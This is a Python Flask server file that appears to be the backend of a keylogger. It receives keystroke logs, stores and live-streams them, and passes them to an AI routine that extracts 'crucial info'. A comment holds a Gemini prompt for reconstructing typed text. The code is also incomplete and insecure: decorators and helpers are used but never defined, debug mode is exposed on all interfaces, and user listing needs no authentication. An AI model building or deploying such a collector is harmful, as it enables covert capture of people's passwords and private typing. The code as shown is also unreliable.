from flask import Flask, request, jsonify, render_template, Response, g
import sqlite3
import os
import time
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from ai_analysis import analyze_keystrokes

app = Flask(__name__)

from dotenv import load_dotenv
import os, google.generativeai as genai

load_dotenv()
genai.configure(api_key=os.getenv("GOOGLE_API_KEY")) #INPUT : Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed

live_keys = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'username and password required'}), 400
    db = get_db()
    try:
        db.execute('INSERT INTO users (username, password) VALUES (?, ?)',
                   (username, generate_password_hash(password)))
        db.commit()
    except sqlite3.IntegrityError:
        return jsonify({'status': 'error', 'message': 'user already exists'}), 400
    return jsonify({'status': 'success', 'message': 'user registered'})

@app.route('/log', methods=['POST'])
@requires_auth
def log():
    data = request.json or {}
    key_data = data.get('key_data', '')
    user_id = g.user['id']

    db = get_db()
    db.execute('INSERT INTO logs (user_id, log) VALUES (?, ?)', (user_id, key_data))
    db.commit()

    username = g.user['username']
    if username not in live_keys:
        live_keys[username] = []
    live_keys[username].append(key_data)

    return jsonify({'status': 'success', 'message': 'Keystroke logged successfully'})

@app.route('/logs/<user>', methods=['GET'])
@requires_auth
def get_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
    logs = [row['log'] for row in cur.fetchall()]
    return jsonify({'status': 'success', 'logs': logs})

@app.route('/users', methods=['GET'])
def get_users():
    db = get_db()
    cur = db.execute('SELECT username FROM users')
    users = [row['username'] for row in cur.fetchall()]
    return jsonify({'status': 'success', 'users': users})

@app.route('/clear_logs/<user>', methods=['DELETE'])
@requires_auth
def clear_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    db.execute('DELETE FROM logs WHERE user_id=?', (g.user['id'],))
    db.commit()
    live_keys.pop(user, None)
    return jsonify({'status': 'success', 'message': f'Logs cleared for {user}'})

@app.route('/log_status', methods=['GET'])
def log_status():
    return jsonify({'status': 'running'})

@app.route('/view_logs/<user>')
@requires_auth
def view_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
    logs = [row['log'] for row in cur.fetchall()]
    logs_dict = {user: logs}
    return render_template('view_logs.html', user=user, logs=logs_dict)

@app.route('/live_logs/<user>')
@requires_auth
def live_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    return render_template('live_logs.html', user=user)

@app.route('/live_logs_stream/<user>')
@requires_auth
def live_logs_stream(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403

    def generate():
        while True:
            if user in live_keys:
                while live_keys[user]:
                    key = live_keys[user].pop(0)
                    yield f"data: {key}\n\n"
            time.sleep(0.1)
    return Response(generate(), mimetype='text/event-stream')

@app.route('/analyze/<user>', methods=['GET'])
@requires_auth
def analyze(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
    logs = ''.join(row['log'] for row in cur.fetchall())
    crucial_info = analyze_keystrokes(logs)
    return jsonify({'status': 'success', 'crucial_info': crucial_info})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
